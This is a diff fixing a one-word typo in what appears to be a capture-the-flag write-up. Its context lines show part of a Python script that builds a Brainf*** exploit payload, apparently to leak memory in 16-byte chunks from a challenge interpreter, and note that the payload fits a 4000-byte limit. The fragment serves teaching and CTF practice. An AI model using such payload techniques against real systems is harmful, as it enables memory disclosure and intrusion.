@@ -264,7 +264,7 @@ bf_payload += '<' * (8 + 2) + '.' + '>' * 0x10 + '[-' + '<' * 0x10 + '+' + '>' *
 bf_payload += '>' + '.' + '>' * 0x10 + '[-' + '<' * 0x10 + '+' + '>' * 0x10 + ']' + '.'  + '<' * 0x10 + '+' * 0x10
 bf_payload += ('>' + '.' + '>' * 0x10 + '[-' + '<' * 0x10 + '+' + '>' * 0x10 + ']' + '.'  + '<' * 0x10) * 4
 ``` 
-The final, full script to create the modified brainf*** script and store it in a file for local testing is below; it came it at a mere 838 characters even with some extra characters for debugging left in, so well within the maximum of 4000 bytes:
+The final, full script to create the modified brainf*** script and store it in a file for local testing is below; it came in at a mere 838 characters even with some extra characters for debugging left in, so well within the maximum of 4000 bytes:
 ```
 file1 = open('sample_program', 'wb')
 
